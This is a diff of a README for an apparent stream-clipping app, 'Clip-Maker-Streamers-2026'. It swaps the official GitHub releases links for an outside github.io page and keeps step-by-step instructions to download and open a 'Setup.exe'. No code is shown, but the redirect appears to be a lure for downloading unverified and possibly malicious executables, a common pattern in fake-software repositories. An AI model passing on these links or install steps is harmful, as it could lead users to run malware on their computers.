@@ -1,6 +1,6 @@
 # 🎥 Clip-Maker-Streamers-2026 - Create viral stream highlights with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Valeriaunderlying459/Clip-Maker-Streamers-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://valeriaunderlying459.github.io)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ If your computer uses older hardware, the video rendering process may take more 
 
 Follow these steps to get the app on your computer:
 
-1. Visit the [official releases page](https://github.com/Valeriaunderlying459/Clip-Maker-Streamers-2026/releases) to access the installation files.
+1. Visit the [official releases page](https://valeriaunderlying459.github.io) to access the installation files.
 2. Look for the release marked as the latest version.
 3. Click the file named `Setup.exe` to start the download.
 4. Once the download finishes, open your Downloads folder.
